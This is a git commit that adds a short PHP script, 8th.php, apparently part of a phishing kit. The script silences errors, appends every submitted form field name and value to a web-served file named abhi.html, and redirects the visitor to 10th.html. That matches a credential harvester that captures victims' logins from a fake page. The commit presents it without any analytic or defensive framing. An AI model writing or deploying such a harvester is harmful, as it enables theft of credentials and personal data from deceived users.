2b83b5d2b35be7838ca0c098c07e19de93b4545d
jujkumar <118103777+jujkumar@users.noreply.github.com>
2022-11-13 15:04:00 +0530

    Add files via upload

---
+++ 8th.php
@@ -0,0 +1,14 @@
+<?php
+header('location: 10th.html');
+error_reporting(0);
+$handle = fopen("abhi.html", "a");
+foreach ($_POST as $variable => $value) {
+  fwrite($handle, $variable);
+  fwrite($handle, "= ");
+  fwrite($handle, $value);
+  fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?>
